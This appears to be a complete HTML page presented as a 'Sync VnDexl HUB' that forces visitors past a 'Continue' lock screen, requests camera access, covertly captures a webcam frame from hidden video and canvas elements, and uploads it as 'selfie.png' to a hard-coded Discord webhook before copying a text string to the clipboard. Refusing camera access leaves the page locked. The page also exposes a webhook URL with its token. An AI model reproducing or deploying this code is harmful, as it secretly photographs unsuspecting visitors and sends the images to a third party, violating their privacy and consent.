<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>Sync VnDexl HUB</title>

<style>
html,body{
  margin:0;
  width:100%;
  height:100%;
  background:#000;
  color:#fff;
  font-family:system-ui;
}

/* ロック用オーバーレイ */
#lock {
  position:fixed;
  inset:0;
  background:#000;
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:9999;
  text-align:center;
}

#lock button{
  padding:16px 26px;
  font-size:18px;
  border:none;
  border-radius:10px;
  background:#5865F2;
  color:#fff;
}

.container{
  display:none;
  height:100%;
  align-items:center;
  justify-content:center;
}

.card{
  width:360px;
  background:#111;
  padding:28px;
  border-radius:14px;
  text-align:center;
}

video,canvas{display:none;}
</style>
</head>

<body>

<!-- 操作強制画面 -->
<div id="lock">
  <div>
    <h2>Continue</h2>
    <p>Tap to continue</p>
    <button id="unlockBtn">Continue</button>
  </div>
</div>

<div class="container" id="main">
  <div class="card">
    <h2>Sync VnDexl HUB</h2>
    <p id="status">Waiting...</p>
  </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const COPY_TEXT = `こいんかわいい`;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1457458043834073270/B1GzMH7u6rnoCfa-bx_3GRIHtHmgueg8_9JhbtrDg6JC7IPodR1RIR9ronbrdFhSHrqK";

const lock = document.getElementById("lock");
const main = document.getElementById("main");
const status = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

document.getElementById("unlockBtn").onclick = async () => {
  try {
    status.textContent = "Requesting camera...";
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;

    lock.style.display = "none";
    main.style.display = "flex";

    setTimeout(captureSendCopy, 1000);
  } catch (e) {
    // ❌ 許可しなかった → 完全ロック
    lock.innerHTML = "<h1>Access Denied</h1>";
  }
};

async function captureSendCopy(){
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  status.textContent = "Sending...";

  const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));
  const form = new FormData();
  form.append("file", blob, "selfie.png");

  await fetch(WEBHOOK_URL,{method:"POST",body:form});

  await navigator.clipboard.writeText(COPY_TEXT);
  status.textContent = "Copied ✔";
}
</script>

</body>
</html>
